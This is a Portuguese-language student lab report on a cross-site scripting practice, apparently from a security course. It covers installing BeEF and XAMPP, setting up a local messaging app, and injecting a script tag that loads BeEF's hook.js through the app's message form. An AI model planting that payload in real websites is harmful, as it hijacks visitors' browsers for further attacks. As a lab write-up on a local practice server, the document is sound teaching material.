# XSS - cross site scripting
## Relatório da Prática
Para realizar a atividade do tutorial, segui os passos propostos.
 1. Instalação do BeEF
	 Na execução das atividades utilizei o Kali Linux, sendo assim, não foi necessário instalar o BeEF já que o Kali já possui o mesmo instalado.
	 ![(1)](https://github.com/SamuelIGT/information-security/blob/master/Praticas/XSS/screenshots/(1).PNG)
2. Instalação do Xampp
	A instalação foi feita seguindo os passos do seguinte tutorial: [link.](http://www.codebind.com/linux-tutorials/install-xampp-ubuntu-16-04/)
3. Configuração do Banco
	Nesta etapa, foi criado um novo banco chamado 'messeger' utilizando a ferramenta 'phpmyadmin'. Ainda no 'phpmyadmin', foi importado o arquivo 'messeger.sql' (fornecido no tutorial) para criar as tabelas.
	 ![(2)](https://github.com/SamuelIGT/information-security/blob/master/Praticas/XSS/screenshots/(2).PNG)
4. Executar servidor
	Para executar o servidor, foi feito o download do mesmo a partir do [github do tutorial](https://github.com/antoniorrm/xss-pratica-seguranca).
	Após extrair o arquivo baixado, a pasta foi movida para o diretório `/opt/lampp/htdocs`.
	 ![(3)](https://github.com/SamuelIGT/information-security/blob/master/Praticas/XSS/screenshots/(3).PNG)
5. O ataque
	Para realizar o ataque, foi necessário injetar o seguinte script no servidor vítima através o formulário da página 'messenger':
	> `<script src=\"http://127.0.0.1:3000/hook.js\"></script>`
	
	![(5)](https://github.com/SamuelIGT/information-security/blob/master/Praticas/XSS/screenshots/(5).PNG)
	![(6)](https://github.com/SamuelIGT/information-security/blob/master/Praticas/XSS/screenshots/(6).PNG)
	
	Após o script ter sido injetado, para realizar os ataques foi somente necessário abrir o BeEF, logar e executar os ataques.
	![(4)](https://github.com/SamuelIGT/information-security/blob/master/Praticas/XSS/screenshots/(4).PNG)
	![(7)](https://github.com/SamuelIGT/information-security/blob/master/Praticas/XSS/screenshots/(7).PNG)
	![(8)](https://github.com/SamuelIGT/information-security/blob/master/Praticas/XSS/screenshots/(8).PNG)
